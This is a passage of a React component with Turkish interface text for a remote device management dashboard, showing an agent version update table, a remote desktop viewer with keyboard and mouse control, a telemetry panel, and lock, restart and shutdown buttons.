                          devices.filter(d => d.status === "online" && d.agent_version !== latestVersion).length > 0
                            ? "bg-[#238636] hover:bg-[#2ea043] text-white cursor-pointer"
                            : "bg-[#30363d] text-[#8b949e] cursor-not-allowed"
                        }`}
                      >
                        <UploadCloud size={14} />
                        Çevrimiçi Eski Sürümleri Güncelle ({devices.filter(d => d.status === "online" && d.agent_version !== latestVersion).length})
                      </button>
                    </div>
                  </div>

                  {/* Detaylı Ajan Sürüm Listesi */}
                  <div className="bg-[#161b22] border border-[#30363d] rounded-lg overflow-hidden">
                    <div className="p-4 border-b border-[#30363d] bg-[#1f242c] font-semibold text-xs text-[#f0f6fc]">
                      Ajan Sürüm Dağılımı ve Güncelleme İlerlemesi
                    </div>
                    <table className="w-full text-left border-collapse text-xs">
                      <thead>
                        <tr className="bg-[#161b22] border-b border-[#30363d] text-[#8b949e] font-medium">
                          <th className="p-3">Cihaz Adı / Hostname</th>
                          <th className="p-3">Mevcut Sürüm</th>
                          <th className="p-3">Durum</th>
                          <th className="p-3">Güncelleme Durumu</th>
                          <th className="p-3 text-right">İşlem</th>
                        </tr>
                      </thead>
                      <tbody>
                        {devices.length === 0 ? (
                          <tr>
                            <td colSpan={5} className="p-6 text-center text-[#8b949e]">
                              Kayıtlı aktif cihaz bulunamadı.
                            </td>
                          </tr>
                        ) : (
                          devices.map(d => {
                            const isOutdated = d.agent_version !== latestVersion;
                            const progress = deviceUpdateProgress[d.id];
                            return (
                              <tr key={d.id} className="border-b border-[#30363d] hover:bg-[#21262d]/30 transition-all">
                                <td className="p-3 font-semibold text-[#f0f6fc]">
                                  {d.hostname}
                                  <span className="block text-[10px] text-[#8b949e] font-mono">{d.id}</span>
                                </td>
                                <td className="p-3">
                                  <span className={`font-mono text-[10px] px-1.5 py-0.5 rounded border ${
                                    isOutdated 
                                      ? "bg-[#f1e05a]/5 text-[#f1e05a] border-[#f1e05a]/30" 
                                      : "bg-[#238636]/5 text-[#56d364] border-[#238636]/30"
                                  }`}>
                                    v{d.agent_version}
                                  </span>
                                </td>
                                <td className="p-3">
                                  <span className={`inline-flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] ${
                                    d.status === "online" ? "text-[#56d364]" : "text-[#f85149]"
                                  }`}>
                                    <span className={`w-1.5 h-1.5 rounded-full ${
                                      d.status === "online" ? "bg-[#56d364]" : "bg-[#f85149]"
                                    }`} />
                                    {d.status === "online" ? "Online" : "Offline"}
                                  </span>
                                </td>
                                <td className="p-3 font-mono text-[10px] text-[#8b949e]">
                                  {progress || (isOutdated ? "Güncelleme Bekliyor" : "Güncel")}
                                </td>
                                <td className="p-3 text-right">
                                  {isOutdated && d.status === "online" && (
                                    <button
                                      onClick={() => triggerUpdate(d.id)}
                                      className="bg-[#238636] hover:bg-[#2ea043] text-white text-[10px] font-semibold px-2.5 py-1 rounded transition-all flex items-center gap-1 inline-flex"
                                    >
                                      <UploadCloud size={10} />
                                      Güncelle
                                    </button>
                                  )}
                                </td>
                              </tr>
                            );
                          })
                        )}
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
            </div>
          )
        ) : (
          // View 2: Remote Desktop Viewer / Control Screen
          <div className="flex-1 flex flex-col md:flex-row gap-6">
            
            {/* Left: Interactive Canvas Screen */}
            <div className="flex-1 flex flex-col bg-black border border-[#30363d] rounded-lg overflow-hidden relative">
              
              {/* Remote Header controls */}
              <div className="bg-[#161b22] border-b border-[#30363d] px-4 py-2 flex items-center justify-between text-xs">
                <div className="flex items-center gap-3">
                  <button 
                    onClick={stopSession}
                    className="flex items-center gap-1 text-[#8b949e] hover:text-[#f0f6fc] font-semibold border border-[#30363d] bg-[#21262d] px-2.5 py-1 rounded cursor-pointer"
                  >
                    <ChevronLeft size={14} />
                    Geri Dön
                  </button>
                  <span className="font-semibold text-[#f0f6fc]">{telemetry?.hostname}</span>
                  <span className="text-[#8b949e]">|</span>
                  <span className="text-[#8b949e]">FPS: <strong className="text-[#56d364]">{fps}</strong></span>
                  <span className="text-[#8b949e]">Bant Genişliği: <strong>{frameSizeKB} KB/frame</strong></span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="bg-[#238636]/10 text-[#56d364] px-2 py-0.5 rounded border border-[#238636]/30 flex items-center gap-1.5">
                    <span className="w-1.5 h-1.5 rounded-full bg-[#56d364]" />
                    Canlı Kontrol
                  </span>
                </div>
              </div>

              {/* Canvas viewport container */}
              <div 
                className="flex-1 flex items-center justify-center overflow-auto p-4 focus:outline-none"
                tabIndex={0}
                onKeyDown={handleKeyDown}
                onKeyUp={handleKeyUp}
              >
                <canvas
                  ref={canvasRef}
                  onMouseMove={handleMouseMove}
                  onMouseDown={handleMouseDown}
                  onMouseUp={handleMouseUp}
                  onContextMenu={e => e.preventDefault()}
                  className="max-w-full max-h-[75vh] object-contain shadow-2xl cursor-crosshair border border-[#30363d] bg-[#111]"
                  style={{ width: "100%", height: "auto" }}
                />
              </div>

              {/* Status bar */}
              <div className="bg-[#161b22] border-t border-[#30363d] px-4 py-2 flex items-center justify-between text-[11px] text-[#8b949e]">
                <div>Çözünürlük ve girdiler otomatik olarak eşlenmektedir.</div>
                <div className="flex items-center gap-3">
                  <span>Kontrol Etkin: Klavye + Fare</span>
                </div>
              </div>
            </div>

            {/* Right: Remote Settings & Administration Panel */}
            <div className="w-full md:w-80 flex flex-col gap-6">
              
              {/* Device Info Panel */}
              <div className="bg-[#161b22] border border-[#30363d] rounded-lg p-4 flex flex-col gap-4">
                <h3 className="font-semibold text-[#f0f6fc] border-b border-[#30363d] pb-2 text-sm flex items-center gap-2">
                  <Laptop size={16} className="text-[#58a6ff]" />
                  Ajan Telemetrisi
                </h3>
                <div className="flex flex-col gap-3 text-xs">
                  <div>
                    <span className="text-[#8b949e] block">Oturum Kullanıcısı</span>
                    <span className="font-medium text-[#c9d1d9]">{telemetry?.username || "-"}</span>
                  </div>
                  <div>
                    <span className="text-[#8b949e] block">İşletim Sistemi</span>
                    <span className="font-medium text-[#c9d1d9]">{telemetry?.osVersion || "-"}</span>
                  </div>
                  <div>
                    <span className="text-[#8b949e] block">IP Adresi</span>
                    <span className="font-mono text-[#c9d1d9]">{telemetry?.ipAddress || "-"}</span>
                  </div>
                  <div>
                    <span className="text-[#8b949e] block">CPU</span>
                    <span className="font-medium text-[#c9d1d9]">{telemetry?.cpu || "-"}</span>
                  </div>
                  <div>
                    <span className="text-[#8b949e] block">RAM Bellek</span>
                    <span className="font-medium text-[#c9d1d9]">{telemetry?.ram || "-"}</span>
                  </div>
                  <div>
                    <span className="text-[#8b949e] block">Ajan Versiyonu</span>
                    <span className="font-mono text-[#c9d1d9]">{telemetry?.version || "1.0.0"}</span>
                  </div>
                </div>
              </div>

              {/* Administrative Controls */}
              <div className="bg-[#161b22] border border-[#30363d] rounded-lg p-4 flex flex-col gap-4">
                <h3 className="font-semibold text-[#f0f6fc] border-b border-[#30363d] pb-2 text-sm flex items-center gap-2">
                  <Settings size={16} className="text-[#f1e05a]" />
                  Uzak Yönetim Komutları
                </h3>
                <div className="flex flex-col gap-2 text-xs">
                  <button
                    onClick={sendLock}
                    className="w-full flex items-center gap-3 text-left bg-[#21262d] border border-[#30363d] hover:bg-[#30363d] px-3 py-2 rounded text-xs text-[#c9d1d9] transition-all cursor-pointer"
                  >
                    <Lock size={14} className="text-[#58a6ff]" />
                    Oturumu Kilitle
                  </button>
                  <button
                    onClick={sendRestart}
                    className="w-full flex items-center gap-3 text-left bg-[#21262d] border border-[#30363d] hover:bg-[#30363d] px-3 py-2 rounded text-xs text-[#c9d1d9] transition-all cursor-pointer"
                  >
                    <RotateCcw size={14} className="text-[#e2c56b]" />
                    Bilgisayarı Yeniden Başlat
                  </button>
                  <button
                    onClick={sendShutdown}
                    className="w-full flex items-center gap-3 text-left bg-[#21262d] border border-[#30363d] hover:bg-[#da3637]/25 hover:border-[#f85149] px-3 py-2 rounded text-xs text-[#f85149] transition-all cursor-pointer"
                  >
                    <Power size={14} />
                    Bilgisayarı Kapat
                  </button>
                </div>
              </div>

              {/* Remote Upgrade Module (Self-Contained) */}
              <div className="bg-[#161b22] border border-[#30363d] rounded-lg p-4 flex flex-col gap-4">
                <h3 className="font-semibold text-[#f0f6fc] border-b border-[#30363d] pb-2 text-sm flex items-center gap-2">
                  <UploadCloud size={16} className="text-[#56d364]" />
                  Ajan Sürüm Güncelleme
                </h3>
                <div className="flex flex-col gap-2 text-xs">
                  <p className="text-[11px] text-[#8b949e]">
                    Bu cihaza uzaktan tek tıkla güncelleme gönderebilirsiniz. Ajan yeni sürümü arka planda kurup otomatik bağlanacaktır.
                  </p>
                  
                  {activeDeviceId && (
                    <button
                      onClick={() => triggerUpdate(activeDeviceId)}
                      className="w-full bg-[#238636] hover:bg-[#2ea043] text-white font-medium py-2 rounded transition-all text-xs cursor-pointer flex items-center justify-center gap-1.5"
                    >
                      <UploadCloud size={14} />
                      Şimdi Güncelle ({latestVersion})
                    </button>
                  )}

                  {activeDeviceId && deviceUpdateProgress[activeDeviceId] && (
                    <div className="mt-2 p-2 bg-[#21262d] border border-[#30363d] rounded text-[11px] text-[#8b949e] break-all">
                      {deviceUpdateProgress[activeDeviceId]}
                    </div>
                  )}
                </div>
              </div>

            </div>
          </div>
        )}
      </main>
    </div>
  );
}
